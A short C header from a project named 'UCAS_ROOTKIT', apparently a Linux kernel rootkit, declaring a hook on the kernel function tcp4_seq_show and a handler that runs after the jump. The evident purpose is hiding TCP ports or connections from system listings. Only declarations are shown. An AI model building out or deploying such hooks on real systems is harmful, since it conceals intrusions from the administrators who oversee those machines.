//
// Created by black on 22-10-19.
//

#ifndef UCAS_ROOTKIT_PORT_H
#define UCAS_ROOTKIT_PORT_H

#include <linux/seq_file.h>

long HookTcp4SeqShow(struct pt_regs *regs, long (*pFunction)(const struct pt_regs *));

int AfterJumpInTcp4SeqShow(struct seq_file *seq, void *v);

#endif //UCAS_ROOTKIT_PORT_H
